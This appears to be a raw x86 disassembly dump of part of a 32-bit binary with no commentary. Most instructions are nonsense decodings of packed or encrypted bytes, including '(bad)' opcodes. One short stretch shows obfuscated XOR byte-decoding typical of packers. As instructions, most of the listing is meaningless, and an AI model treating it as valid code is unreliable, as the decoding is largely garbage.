  403a2e:	test   DWORD PTR [ebp+esi*4+0x46],esi
  403a32:	in     eax,0x37
  403a34:	xchg   esi,eax
  403a35:	in     al,0x40
  403a37:	and    BYTE PTR ds:0x66fcb6f8,dl
  403a3d:	popa   
  403a3e:	jmp    0x403a96
  403a40:	adc    eax,0x345c5533
  403a45:	add    al,0x24
  403a47:	hlt    
  403a48:	pop    ebp
  403a49:	mov    eax,0xfddb7290
  403a4e:	test   BYTE PTR [bx-0x56],dl
  403a52:	xlat   BYTE PTR ds:[ebx]
  403a53:	adc    al,0xa2
  403a55:	jge    0x403a0f
  403a57:	push   eax
  403a58:	sub    DWORD PTR [ecx-0x7c0403f5],edx
  403a5e:	mov    ch,0xe1
  403a60:	sub    BYTE PTR [edx],cl
  403a62:	push   esp
  403a63:	add    BYTE PTR [ecx+ebp*4+0x2a1d4c05],ch
  403a6a:	sbb    dl,BYTE PTR [edx+0x5f]
  403a6d:	xchg   ebp,eax
  403a6e:	shl    BYTE PTR [ebx],1
  403a70:	scas   eax,DWORD PTR es:[edi]
  403a71:	mov    bl,0x38
  403a73:	das    
  403a74:	cmp    BYTE PTR [edi-0x3d],ch
  403a77:	test   al,0xea
  403a79:	inc    esp
  403a7a:	retf   0x6cea
  403a7d:	neg    BYTE PTR [esi+0x13]
  403a80:	adc    BYTE PTR [esi+0x47],bl
  403a83:	psubb  mm3,mm3
  403a86:	out    0x1e,eax
  403a88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a89:	sbb    al,0x83
  403a8b:	cdq    
  403a8c:	mov    ch,BYTE PTR [eax+0x1053f7a1]
  403a92:	imul   esp,edx,0x725820d9
  403a98:	cld    
  403a99:	add    al,0x95
  403a9b:	in     eax,0xa9
  403a9d:	test   BYTE PTR [eax-0x4221addc],0x3f
  403aa4:	inc    eax
  403aa5:	pop    ebp
  403aa6:	mov    esp,0xbe78e674
  403aab:	pusha  
  403aac:	or     bh,BYTE PTR [ecx+ebp*8-0x75]
  403ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab1:	and    eax,0xc0498a7c
  403ab6:	adc    al,al
  403ab8:	sub    al,0x88
  403aba:	mov    al,ds:0xc9ae0e
  403abf:	dec    edx
  403ac0:	xchg   DWORD PTR [ebp+0x6d7f9873],edx
  403ac6:	ror    DWORD PTR [esi-0x5b],cl
  403ac9:	xchg   esp,eax
  403aca:	xchg   ebx,eax
  403acb:	stos   BYTE PTR es:[edi],al
  403acc:	imul   eax,DWORD PTR [eax],0x875ee6a2
  403ad2:	je     0x403a90
  403ad4:	je     0x403af8
  403ad6:	test   DWORD PTR [ecx+0x4],esi
  403ad9:	scas   al,BYTE PTR es:[edi]
  403ada:	inc    ebp
  403adb:	rol    ebx,1
  403add:	sub    BYTE PTR [edx+0x64],dl
  403ae0:	in     al,dx
  403ae1:	add    esp,DWORD PTR [edi+ebp*1]
  403ae4:	inc    edx
  403ae5:	inc    esi
  403ae6:	fadd   QWORD PTR [edx+eax*1]
  403ae9:	mov    BYTE PTR [eax-0x68f828cc],0x80
  403af0:	frstor [ebp+0xb]
  403af3:	aas    
  403af4:	data16 jge 0x403b51
  403af7:	popf   
  403af8:	cmp    dl,BYTE PTR [esi+0x5d]
  403afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403afc:	mov    BYTE PTR [ebx],dl
  403afe:	cmp    eax,0xca78914e
  403b03:	or     ecx,edi
  403b05:	xchg   edi,eax
  403b06:	mov    bh,0x7b
  403b08:	(bad)  
  403b09:	in     eax,dx
  403b0a:	test   BYTE PTR [esi-0x12],ch
  403b0d:	es add al,0x1c
  403b10:	lods   eax,DWORD PTR ds:[esi]
  403b11:	test   BYTE PTR [edi-0x12],dl
  403b14:	fst    st(5)
  403b16:	arpl   WORD PTR [eax+0x5acba978],ax
  403b1c:	sbb    eax,0x52cb3f78
  403b21:	push   esi
  403b22:	arpl   di,cx
  403b24:	mov    edx,0xb697f855
  403b29:	ja     0x403ba0
  403b2b:	into   
  403b2c:	test   BYTE PTR [ebp-0x32],bh
  403b2f:	mov    bh,0x16
  403b31:	(bad)
  403b34:	mov    bh,0xde
  403b36:	shl    DWORD PTR [esi+0x30],cl
  403b39:	mov    eax,ds:0x71fb32ce
  403b3e:	pusha  
  403b3f:	jecxz  0x403b4c
  403b41:	pop    edx
  403b42:	sub    bl,BYTE PTR [eax]
  403b44:	xlat   BYTE PTR ds:[ebx]
  403b45:	xchg   ecx,eax
  403b46:	out    dx,al
  403b47:	add    al,0x3
  403b49:	cmp    esi,DWORD PTR [edi+0x3a244baa]
  403b4f:	das    
  403b50:	or     eax,eax
  403b52:	add    bl,BYTE PTR [edx-0x9]
  403b55:	int    0x39
  403b57:	jp     0x403af9
  403b59:	rcl    ebp,1
  403b5b:	pop    eax
  403b5c:	cs xchg edi,eax
  403b5e:	jmp    0x1e1bdc70
  403b63:	cmp    eax,DWORD PTR [eax]
  403b65:	mov    edi,ecx
  403b67:	in     al,0x87
  403b69:	test   BYTE PTR [edx],0x97
  403b6c:	js     0x403ba0
  403b6e:	bound  ebp,QWORD PTR ds:0x2a4abad4
  403b74:	lds    edi,FWORD PTR [esi-0x41a5a793]
  403b7a:	iret   
  403b7b:	dec    eax
  403b7c:	xchg   edx,eax
  403b7d:	inc    ecx
  403b7e:	popa   
  403b7f:	(bad)  
  403b81:	jb     0x403baf
  403b83:	pop    es
  403b84:	retf   0xde72
  403b87:	mov    ds:0x8a2e337e,al
  403b8c:	ret    
  403b8d:	out    dx,eax
  403b8e:	mov    bh,0x5d
  403b90:	int    0x69
  403b92:	adc    DWORD PTR [eax+0x5],esp
  403b95:	test   al,0xd0
  403b97:	and    eax,0x2e2cb288
  403b9c:	pop    es
  403b9d:	xchg   ebx,eax
  403b9e:	or     al,0xf0
  403ba0:	nop
  403ba1:	mov    eax,0xf5c7f2dd
  403ba6:	outs   dx,BYTE PTR ds:[esi]
  403ba7:	popf   
  403ba8:	cmp    al,0x63
  403baa:	push   cs
  403bab:	js     0x403b93
  403bad:	jo     0x403b4e
  403baf:	mov    esi,0xa81025d6
  403bb4:	jmp    0xd6d8:0x4c82c50e
  403bbb:	sub    eax,0xd528b1f2
  403bc0:	ds xor ecx,eax
  403bc3:	mov    ds:0xaae26055,eax
  403bc8:	ss mov ch,0x72
  403bcb:	sub    BYTE PTR [edi+0x1d7188e1],bh
  403bd1:	cmp    bl,BYTE PTR [ebp+ecx*4+0x3c980519]
  403bd8:	pop    ss
  403bd9:	jg     0x403bf5
  403bdb:	and    BYTE PTR [eax+0x75b90595],bl
  403be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403be2:	cmp    edi,esp
  403be4:	js     0x403c42
  403be6:	aas    
  403be7:	or     eax,0x9a81f1ac
  403bec:	sar    BYTE PTR [edi+0x2ff14c85],1
  403bf2:	push   cs
  403bf3:	adc    esi,ecx
  403bf5:	sub    DWORD PTR [edi],ecx
  403bf7:	push   ds
  403bf8:	out    0x40,al
  403bfa:	push   ds
  403bfb:	add    DWORD PTR [eax],ebx
  403bfd:	mov    cl,bh
  403bff:	mov    ebx,0x346a213f
  403c04:	out    0x68,eax
  403c06:	mov    ch,0x21
  403c08:	xor    BYTE PTR [ebx],al
  403c0a:	xchg   edi,eax
  403c0b:	or     dh,ch
  403c0d:	sbb    DWORD PTR [eax+0x58],edx
  403c10:	test   eax,0x82aa9ea5
  403c15:	retf   0xb988
  403c18:	call   0x46076285
  403c1d:	mov    esp,0xf89c85bc
  403c22:	mov    eax,DWORD PTR [ebp-0x38]
  403c25:	mov    edx,DWORD PTR [ebp-0x14]
  403c28:	xor    eax,esi
  403c2a:	add    eax,edi
  403c2c:	cmp    edx,eax
  403c2e:	je     0x40617c
  403c34:	mov    eax,DWORD PTR [ebp-0x20]
  403c37:	xor    eax,esi
  403c39:	mov    edx,0xffcd8d0b
  403c3e:	sub    edx,eax
  403c40:	add    edx,DWORD PTR [ebp-0x14]
  403c43:	mov    eax,DWORD PTR [ebp-0x20]
  403c46:	mov    ebx,DWORD PTR [ebp-0x10]
  403c49:	xor    eax,esi
  403c4b:	add    eax,edi
  403c4d:	imul   eax,ebx
  403c50:	cmp    eax,edx
  403c52:	ja     0x406179
  403c58:	mov    edx,DWORD PTR [ebp-0x10]
  403c5b:	mov    eax,DWORD PTR [ebp-0x14]
  403c5e:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c61:	sub    eax,edx
  403c63:	xor    ebx,esi
  403c65:	xor    edx,edx
  403c67:	add    ebx,edi
  403c69:	div    ebx
  403c6b:	mov    DWORD PTR [ebp-0x8],eax
  403c6e:	mov    eax,DWORD PTR [ebp-0x44]
  403c71:	mov    edx,DWORD PTR [ebp-0x8]
  403c74:	xor    eax,esi
  403c76:	add    eax,edi
  403c78:	cmp    edx,eax
  403c7a:	jbe    0x403c8a
  403c80:	mov    eax,DWORD PTR [ebp-0x44]
  403c83:	xor    eax,esi
  403c85:	add    eax,edi
  403c87:	mov    DWORD PTR [ebp-0x8],eax
  403c8a:	mov    eax,DWORD PTR [ebp-0x2c]
  403c8d:	mov    edx,DWORD PTR [ebp-0x8]
  403c90:	xor    eax,esi
  403c92:	add    eax,edi
  403c94:	imul   eax,edx
  403c97:	mov    DWORD PTR [ebp-0x8],eax
  403c9a:	mov    eax,DWORD PTR [ebp-0x38]
  403c9d:	mov    edx,DWORD PTR [ebp-0x8]
  403ca0:	xor    eax,esi
  403ca2:	add    eax,edi
  403ca4:	cmp    edx,eax
  403ca6:	je     0x406162
  403cac:	mov    eax,DWORD PTR [ebp-0x8]
  403caf:	mov    DWORD PTR [ebp-0x18],eax
  403cb2:	mov    eax,DWORD PTR [ebp-0x10]
  403cb5:	add    eax,DWORD PTR [ebp-0x54]
  403cb8:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403cbf:	mov    DWORD PTR [ebp-0x8],eax
  403cc2:	mov    eax,0xf89c85a2
  403cc7:	mov    DWORD PTR [ebp-0x28],eax
  403cca:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cd1:	mov    DWORD PTR [ebp-0x40],0xf89c85a0
  403cd8:	mov    DWORD PTR [ebp-0x30],eax
  403cdb:	mov    eax,DWORD PTR [ebp-0x1c]
  403cde:	xor    eax,esi
  403ce0:	add    eax,edi
  403ce2:	jmp    0x40611e
  403ce7:	mov    DWORD PTR [ebp-0x4c],0xf89c85b8
  403cee:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cf5:	mov    eax,DWORD PTR [ebp-0x30]
  403cf8:	mov    edx,DWORD PTR [ebp-0xc]
  403cfb:	xor    eax,esi
  403cfd:	add    eax,edi
  403cff:	imul   eax,edx
  403d02:	mov    edx,DWORD PTR [ebp-0x8]
  403d05:	mov    al,BYTE PTR [eax+edx*1]
  403d08:	mov    BYTE PTR [ebp-0x1],al
  403d0b:	mov    eax,DWORD PTR [ebp-0x30]
  403d0e:	mov    edx,DWORD PTR [ebp-0xc]
  403d11:	xor    eax,esi
  403d13:	add    eax,edi
  403d15:	imul   eax,edx
  403d18:	mov    edx,DWORD PTR [ebp-0x5c]
  403d1b:	xor    edx,esi
  403d1d:	add    eax,edx
  403d1f:	mov    edx,DWORD PTR [ebp-0x8]
  403d22:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d2a:	mov    edx,DWORD PTR [ebp-0x4c]
  403d2d:	xor    edx,esi
  403d2f:	lea    eax,[edx+eax*1+0x3272f5]
  403d36:	movzx  edx,BYTE PTR [ebp-0x1]
  403d3a:	xor    edx,eax
  403d3c:	mov    BYTE PTR [ebp-0x1],dl
  403d3f:	mov    al,BYTE PTR [ebp-0x1]
  403d42:	mov    edx,DWORD PTR [ebp-0x30]
  403d45:	mov    ebx,DWORD PTR [ebp-0xc]
  403d48:	xor    edx,esi
  403d4a:	add    edx,edi
  403d4c:	imul   edx,ebx
  403d4f:	mov    ebx,DWORD PTR [ebp-0x8]
  403d52:	mov    BYTE PTR [edx+ebx*1],al
  403d55:	mov    eax,DWORD PTR [ebp-0x30]
  403d58:	mov    edx,DWORD PTR [ebp-0xc]
  403d5b:	xor    eax,esi
  403d5d:	add    eax,edi
  403d5f:	imul   eax,edx
  403d62:	mov    edx,DWORD PTR [ebp-0x8]
  403d65:	mov    al,BYTE PTR [eax+edx*1]
  403d68:	mov    BYTE PTR [ebp-0x1],al
  403d6b:	mov    eax,DWORD PTR [ebp-0x30]
  403d6e:	mov    edx,DWORD PTR [ebp-0xc]
  403d71:	xor    eax,esi
  403d73:	add    eax,edi
  403d75:	imul   eax,edx
  403d78:	mov    edx,DWORD PTR [ebp-0x28]
  403d7b:	xor    edx,esi
  403d7d:	add    eax,edx
  403d7f:	mov    edx,DWORD PTR [ebp-0x8]
  403d82:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f5]
  403d8a:	mov    edx,DWORD PTR [ebp-0x50]
  403d8d:	xor    edx,esi
  403d8f:	lea    eax,[edx+eax*1+0x3272f5]
  403d96:	movzx  edx,BYTE PTR [ebp-0x1]
  403d9a:	xor    edx,eax
  403d9c:	mov    BYTE PTR [ebp-0x1],dl
  403d9f:	mov    al,BYTE PTR [ebp-0x1]
  403da2:	mov    edx,DWORD PTR [ebp-0x30]
  403da5:	mov    ebx,DWORD PTR [ebp-0xc]
  403da8:	xor    edx,esi
  403daa:	add    edx,edi
  403dac:	imul   edx,ebx
  403daf:	mov    ebx,DWORD PTR [ebp-0x8]
  403db2:	jmp    0x406107
  403db7:	dec    ebx
  403db8:	inc    eax
  403db9:	sub    eax,0xc4820296
  403dbe:	scas   al,BYTE PTR es:[edi]
  403dbf:	push   0x84dd8915
  403dc4:	xor    DWORD PTR [ecx],ebx
  403dc6:	or     ecx,DWORD PTR [ebx+0x5e]
  403dc9:	add    DWORD PTR [ebx-0x7c7ca1b5],0x37
  403dd0:	in     al,0xac
  403dd2:	jns    0x403e2e
  403dd4:	inc    esp
  403dd5:	fmul   QWORD PTR [ebp-0x7ca11f8a]
  403ddb:	dec    ecx
  403ddc:	mov    dl,0x7b
  403dde:	xchg   ecx,edx
  403de0:	daa    
  403de1:	fistp  DWORD PTR [esi-0x282365b2]
  403de7:	add    DWORD PTR [edi],ebp
  403de9:	scas   al,BYTE PTR es:[edi]
  403dea:	mov    ch,0x17
  403dec:	jae    0x403dbe
  403dee:	cmp    ah,0x99
  403df1:	pushf  
  403df2:	mov    ecx,edi
  403df4:	or     BYTE PTR [edx+0x7c21f354],dl
  403dfa:	mov    ecx,0x22a40507
  403dff:	ja     0x403e79
  403e01:	inc    ebx
  403e02:	aam    0x82
  403e04:	call   0x92ff:0x8b9d864c
  403e0b:	in     eax,dx
  403e0c:	ret    0x47a6
  403e0f:	mov    BYTE PTR [esi-0x4b],bh
  403e12:	fist   WORD PTR [ecx]
  403e14:	popa   
  403e15:	mov    ch,0x9f
  403e17:	add    BYTE PTR [esi+0x784fa7e9],dl
  403e1d:	fsubr  DWORD PTR [edx]
  403e1f:	retf   0xe8ba
  403e22:	or     DWORD PTR [edi],edx
  403e24:	jno    0x403df2
  403e26:	cld    
  403e27:	jmp    0x64de0330
  403e2c:	and    al,BYTE PTR [edi+edx*4-0x14b74891]
  403e33:	ins    DWORD PTR es:[edi],dx
  403e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e35:	push   eax
  403e36:	ins    DWORD PTR es:[edi],dx
  403e37:	outs   dx,BYTE PTR ds:[esi]
  403e38:	mov    ebp,es
  403e3a:	cdq    
  403e3b:	pop    ebp
  403e3c:	and    ecx,ebx
  403e3e:	or     BYTE PTR [ebx],dh
  403e40:	mov    dl,0x81
  403e42:	icebp  
  403e43:	sbb    esi,DWORD PTR [esi-0x4e]
  403e46:	xchg   ebp,ebx
  403e48:	pushf  
  403e49:	or     al,0xbb
  403e4b:	and    DWORD PTR [ecx+0xa],esp
  403e4e:	sub    eax,DWORD PTR [ebx+ebp*1+0x9ec0eca]
  403e55:	cmp    al,0xab
  403e57:	dec    esp
  403e58:	shr    cl,0xb9
  403e5b:	popa   
  403e5c:	cmp    DWORD PTR [esi+0x1ad9cbfa],eax
  403e62:	jp     0x403ed3
  403e64:	add    dh,dl
  403e66:	mov    edi,?
  403e68:	jbe    0x403ede
  403e6a:	mov    ecx,0xea9ca431
  403e6f:	jl     0x403e92
  403e71:	ret    0x8c07
  403e74:	fadd   QWORD PTR [ebp+0x26a81374]
  403e7a:	cmp    al,0x3f
  403e7c:	mov    dl,0xa8
  403e7e:	xor    edi,DWORD PTR [esi-0x3c9f5320]
  403e84:	push   ebp
  403e85:	in     eax,0xff
  403e87:	ret    
  403e88:	adc    al,0xa5
  403e8a:	sub    dl,BYTE PTR [eax+0x75d1bc67]
  403e90:	push   ecx
  403e91:	aad    0x8e
  403e93:	in     al,0xaa
  403e95:	rcl    BYTE PTR [ebx+0x40],cl
  403e98:	and    DWORD PTR [ebx+0x52d974f1],ebp
  403e9e:	(bad)  
  403e9f:	aad    0x13
  403ea1:	or     cl,bh
  403ea3:	sub    al,0xcf
  403ea5:	jbe    0x403ea6
  403ea7:	dec    edx
  403ea8:	cmovp  eax,DWORD PTR [edx+edi*8-0x4b]
  403ead:	xchg   edi,eax
  403eae:	imul   esi,esi,0x7b6160de
  403eb4:	bound  edi,QWORD PTR [eax-0x70]
  403eb7:	in     al,dx
  403eb8:	(bad)  
  403eba:	mov    ecx,DWORD PTR [edi]
  403ebc:	pop    ss
  403ebd:	adc    BYTE PTR [ebx-0x44],0x9f
  403ec1:	aam    0xf7
  403ec3:	push   ss
  403ec4:	mov    bl,0x16
  403ec6:	test   al,0x4a
  403ec8:	xchg   edx,eax
  403ec9:	dec    ecx
  403eca:	scas   eax,DWORD PTR es:[edi]
  403ecb:	lods   eax,DWORD PTR ds:[esi]
  403ecc:	or     eax,0x8d2abd86
  403ed1:	ror    BYTE PTR [ebx-0x8f0c67e],1
  403ed7:	out    0xdd,eax
  403ed9:	push   0xc4e3eff8
  403ede:	fldenv [ecx+0xeb4c6c3]
  403ee4:	je     0x403eb3
  403ee6:	pop    edx
  403ee7:	hlt    
  403ee8:	xchg   esp,eax
  403ee9:	cmp    DWORD PTR [esi+0x78],edx
  403eec:	jmp    0xbf6c:0xcbf3cb9b
  403ef3:	push   eax
  403ef4:	aad    0x23
  403ef6:	ret    
  403ef7:	sub    BYTE PTR [edx-0x5c],cl
  403efa:	ret    
  403efb:	inc    esi
  403efc:	or     al,0x43
  403efe:	ret    
  403eff:	test   al,0x9a
  403f01:	iret   
  403f02:	test   DWORD PTR [ecx],eax
  403f04:	xor    bh,bl
  403f06:	sub    ebp,ebp
  403f08:	adc    edi,DWORD PTR [edi+0x38aef456]
  403f0e:	lahf   
  403f0f:	es (bad) 
  403f11:	(bad)  
  403f12:	jle    0x403f55
  403f14:	mov    dh,0x17
  403f16:	fsub   DWORD PTR [ecx+0x36]
  403f19:	fdiv   DWORD PTR [ebp-0x12]
  403f1c:	cmp    al,0x60
  403f1e:	aam    0xa9
  403f20:	or     BYTE PTR ds:0xc8b78a01,dh
  403f26:	and    eax,0xa7520096
  403f2b:	sbb    DWORD PTR [edx],0xbc1aa615
  403f31:	jbe    0x403ec7
  403f33:	adc    ch,BYTE PTR [eax]
  403f35:	(bad)  
  403f36:	jmp    0x9cf5ce03
  403f3b:	cmp    DWORD PTR [edx],ebx
  403f3d:	test   al,0x47
  403f3f:	aam    0x74
  403f41:	xlat   BYTE PTR ds:[ebx]
  403f42:	sar    BYTE PTR [esi],0xd1
  403f45:	lods   al,BYTE PTR ds:[esi]
  403f46:	outs   dx,BYTE PTR ds:[esi]
  403f47:	pop    eax
  403f49:	mov    esp,0xf0d2a18
  403f4e:	sbb    al,0xb3
  403f50:	imul   edi,DWORD PTR [edx+0x6d6e5b5f],0xc101a25a
  403f5a:	xor    DWORD PTR [edi-0x3a],ebp
  403f5d:	imul   esp,DWORD PTR [edx-0x24],0xceff138e
  403f64:	int3   
  403f65:	gs dec esi
  403f67:	xchg   edx,eax
  403f68:	test   eax,0xe2a8aa44
  403f6d:	sbb    DWORD PTR ds:0x570326ee,ebp
  403f73:	dec    ecx
  403f74:	xor    cl,BYTE PTR [edi+edx*8+0x7b]
  403f78:	ins    DWORD PTR es:[edi],dx
  403f79:	ins    BYTE PTR es:[edi],dx
  403f7a:	in     al,dx
  403f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f7c:	jmp    0x403f6f
  403f7e:	das    
  403f7f:	or     BYTE PTR [ebx+0x59],dl
  403f82:	adc    eax,0x6635d3f
  403f87:	cmp    bl,bl
  403f89:	stc    
  403f8a:	ins    DWORD PTR es:[edi],dx
  403f8b:	test   DWORD PTR [ebx+0x199ea53a],edx
  403f91:	cwde   
  403f92:	pop    esp
  403f93:	inc    edi
  403f94:	mov    edx,0x3172f8b
  403f99:	sub    eax,DWORD PTR [esi+0x0]
  403f9c:	test   al,0xae
  403f9e:	call   0xb3ed:0xe8191202
  403fa5:	jge    0x403fb1
  403fa7:	pop    ecx
  403fa8:	push   0xc2d30cbe
  403fad:	iret   
  403fae:	loop   0x40402b
  403fb0:	or     edi,DWORD PTR [ecx+0x6f]
  403fb3:	sbb    esi,DWORD PTR [ebx-0x43]
  403fb6:	lea    ecx,[ebx+0x31]
  403fb9:	mov    ebx,0x10e3cfd4
  403fbe:	lods   eax,DWORD PTR ds:[esi]
  403fbf:	mov    cl,0xbf
  403fc1:	inc    edx
  403fc2:	fwait
  403fc3:	inc    ebp
  403fc4:	cld    
  403fc5:	jo     0x403fdb
  403fc7:	(bad)  
  403fc8:	xor    eax,0xff37a14c
  403fcd:	mov    ebx,0x76ce6e7f
  403fd2:	sbb    ch,BYTE PTR [ebp+0x6c]
  403fd5:	aaa    
  403fd6:	pop    eax
  403fd7:	(bad)  [ebx+0x72bee14b]
  403fdd:	sub    ah,BYTE PTR [edi+0x30]
  403fe0:	cmp    al,0xa1
  403fe2:	(bad)  
  403fe3:	fld    TBYTE PTR [edi-0x14]
  403fe6:	jo     0x403ff5
  403fe8:	or     ch,al
  403fea:	out    dx,eax
  403feb:	pop    ds
  403fec:	sbb    BYTE PTR [ecx+ecx*8-0x16],0x58
  403ff1:	inc    esp
  403ff2:	ret    0x8c8a
  403ff5:	arpl   WORD PTR [ebx],si
  403ff7:	dec    ebp
  403ff8:	mov    edi,0x3f937858
  403ffd:	fwait
  403ffe:	and    eax,0x7e99c7fc
  404003:	jne    0x40402d
  404005:	stos   DWORD PTR es:[edi],eax
  404006:	in     al,dx
  404007:	enter  0xcd8d,0x1c
  40400b:	jno    0x403fad
  40400d:	sub    dh,ch
  40400f:	jge    0x403f96
  404011:	pop    edi
  404012:	sar    DWORD PTR [edi-0x7d],1
  404015:	das    
  404016:	arpl   di,di
  404018:	icebp  
  404019:	jp     0x404051
  40401b:	mov    eax,ds:0xf11942c8
  404020:	cld    
  404021:	sbb    cl,bh
  404023:	mov    ebp,0xa75a0826
  404028:	or     ebp,DWORD PTR [ebp-0x20e9444a]
  40402e:	xchg   edi,eax
  40402f:	push   edx
  404030:	add    edi,DWORD PTR [ebx-0x54bf2a65]
  404036:	ret    
  404037:	or     esi,esi
  404039:	lock lock push ds
  40403c:	xchg   edi,eax
  40403d:	mov    esp,0xb8246d85
  404042:	call   0x2ab67e4b
  404047:	(bad)  
  404048:	and    DWORD PTR [edi+ecx*1-0x69],edx
  40404c:	dec    eax
  40404d:	mov    dl,0xe3
  40404f:	sub    eax,0x30c11ad2
  404054:	lock das 
  404056:	mov    eax,0x67d1c9af
  40405b:	sbb    DWORD PTR [edi-0x3e],esp
  40405e:	pop    ebp
  40405f:	(bad)  
  404060:	ds mov al,cs:0x5d36267
  404067:	(bad)  
  404068:	and    bh,cl
  40406a:	cmp    ah,BYTE PTR [edx+0x3889fd7]
  404070:	push   cs
  404071:	mov    al,0x6e
  404073:	stos   BYTE PTR es:[edi],al
  404074:	push   ebp
  404075:	jns    0x404058
  404077:	mov    esp,0x3114e773
  40407c:	mov    eax,0xd73aea02
  404081:	xchg   edi,eax
  404082:	es pop ebp
  404084:	add    dl,BYTE PTR [edx+0x30d55f19]
  40408a:	mov    ecx,0x162d2550
  40408f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404090:	xor    ecx,DWORD PTR gs:[edx+ecx*8]
  404094:	push   esi
  404095:	out    0x2e,eax
  404097:	mov    esi,0xec16c37
  40409c:	jns    0x4040f0
  40409e:	adc    ebp,DWORD PTR [edi]
  4040a0:	out    dx,eax
  4040a1:	push   eax
  4040a2:	inc    esp
  4040a3:	sub    eax,0xbca62ae7
  4040a8:	ja     0x404079
  4040aa:	jne    0x404049
  4040ac:	test   eax,0xe9928ea0
  4040b1:	out    0x71,eax
  4040b3:	ins    DWORD PTR es:[edi],dx
  4040b4:	rcr    BYTE PTR [edi+0x4f],cl
  4040b7:	add    al,ah
  4040b9:	push   ebx
  4040ba:	sub    al,0xf3
  4040bc:	mov    ebp,0x6e081f48
  4040c1:	cmc    
  4040c2:	jbe    0x404087
  4040c4:	mov    dl,0x96
  4040c6:	inc    edx
  4040c7:	sbb    al,0x89
  4040c9:	push   ss
  4040ca:	xor    esi,DWORD PTR [ebp+0x3b]
  4040cd:	sub    bl,dh
  4040cf:	xor    al,0x6c
  4040d1:	outs   dx,BYTE PTR ds:[esi]
  4040d2:	pop    eax
  4040d3:	xchg   esp,eax
  4040d4:	pop    ecx
  4040d5:	rol    DWORD PTR [edx-0x7fc875f5],0x58
  4040dc:	xor    edi,esp
  4040de:	mov    cl,0x39
  4040e0:	pop    ecx
  4040e1:	iret   
  4040e2:	pop    eax
  4040e3:	das    
  4040e4:	rcr    DWORD PTR [eax],cl
  4040e6:	mov    WORD PTR [edi],ss
  4040e8:	jne    0x404136
  4040ea:	in     al,dx
  4040eb:	pop    esi
  4040ec:	inc    edx
  4040ed:	adc    DWORD PTR [ebp+0x6c],esp
  4040f0:	jl     0x404137
  4040f2:	push   edi
  4040f3:	add    ch,BYTE PTR [ebx]
  4040f5:	add    ebx,DWORD PTR [esi+0x2c]
  4040f8:	cmp    ah,cl
  4040fa:	xchg   ebp,eax
  4040fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040fc:	push   ss
  4040fd:	aam    0x91
  4040ff:	cli    
  404100:	fist   DWORD PTR [edx]
  404102:	or     bh,BYTE PTR [esi+0x29afd2f7]
  404108:	cmc    
  404109:	xor    eax,0x39800667
  40410e:	inc    ebp
  40410f:	and    eax,0xe7570200
  404114:	jb     0x4040b2
  404116:	jle    0x4040e4
  404118:	cs add cl,al
  40411b:	push   cs
  40411c:	pop    esi
  40411d:	xchg   ecx,eax
  40411e:	adc    ebp,DWORD PTR [edi+0x107fea00]
  404124:	pop    eax
  404125:	xchg   BYTE PTR [edx+0x69e562b6],al
  40412b:	xchg   DWORD PTR [esi-0x67],edi
  40412e:	push   ss
  40412f:	les    ebx,FWORD PTR [ebp+ecx*1-0x583981fd]
  404136:	in     eax,dx
  404137:	and    al,0x4
  404139:	mov    dh,0x5b
  40413b:	jno    0x404158
  40413d:	inc    ebp
  40413e:	or     bl,BYTE PTR [ecx]
  404140:	and    edi,DWORD PTR [esi-0x5f]
  404143:	cmp    DWORD PTR [edi+0x2c8c586f],ebp
  404149:	loopne 0x4040ff
  40414b:	and    eax,0xf746f31f
  404150:	in     eax,dx
  404151:	icebp  
  404152:	sbb    dl,BYTE PTR [edi+eiz*1]
  404155:	sbb    DWORD PTR [edi+ebx*4],ebx
  404158:	and    eax,0x21d0287b
  40415d:	adc    bh,BYTE PTR [eax+ebp*1+0x659ade73]
  404164:	mov    bh,0xf9
  404166:	xor    DWORD PTR [edx-0x5a],ebx
  404169:	jmp    0x404150
  40416b:	xlat   BYTE PTR ds:[ebx]
  40416c:	dec    ebp
  40416d:	arpl   WORD PTR [ebp+eiz*8-0x13d553d7],sp
  404174:	scas   al,BYTE PTR es:[edi]
  404175:	rol    DWORD PTR [ecx-0x3f987db8],0xa8
  40417c:	cli    
  40417d:	cli    
  40417e:	(bad)  
  40417f:	fild   QWORD PTR [eax]
  404181:	test   DWORD PTR cs:[esp+ecx*8+0x2fdf4cf5],0x1c96e6e6
  40418d:	add    DWORD PTR [ebp+0x26],esp
  404190:	imul   edx,edi,0x853dd858
  404196:	pop    eax
  404197:	enter  0x8331,0xd0
  40419b:	push   ss
  40419c:	retf   0x340e
  40419f:	jne    0x4041cf
  4041a1:	jg     0x40421f
  4041a3:	cwde   
  4041a4:	cli    
  4041a5:	inc    ebp
  4041a6:	shr    BYTE PTR [eax],0xdc
  4041a9:	mov    bh,0xc1
  4041ab:	xor    BYTE PTR [esi-0x365342c2],0x1b
  4041b2:	jmp    0x14872878
  4041b7:	jg     0x4041ee
  4041b9:	call   DWORD PTR [ecx+0x13]
  4041bc:	adc    al,0x8f
  4041be:	arpl   WORD PTR [edi],bp
  4041c0:	push   ds
  4041c1:	pop    edi
  4041c2:	imul   edx,DWORD PTR [esi+0x4100bf37],0x3113ce8b
  4041cc:	leave  
  4041cd:	cs xchg ebp,esp
  4041d0:	fld    QWORD PTR [eax+0x7398570]
  4041d6:	add    al,BYTE PTR [ecx]
  4041d8:	adc    ch,BYTE PTR [eax]
  4041da:	mov    DWORD PTR [ebx+0xa678167],ecx
  4041e0:	cdq    
  4041e1:	inc    eax
  4041e2:	xor    al,0xaf
  4041e4:	mov    dl,dl
  4041e6:	sbb    cl,bl
  4041e8:	imul   edx,DWORD PTR [esi],0x1c
  4041eb:	xor    al,BYTE PTR [edi]
  4041ed:	fs mul ebp
  4041f0:	sti    
  4041f1:	jbe    0x4041cc
  4041f3:	mov    eax,0xff25ce74
  4041f8:	(bad)  
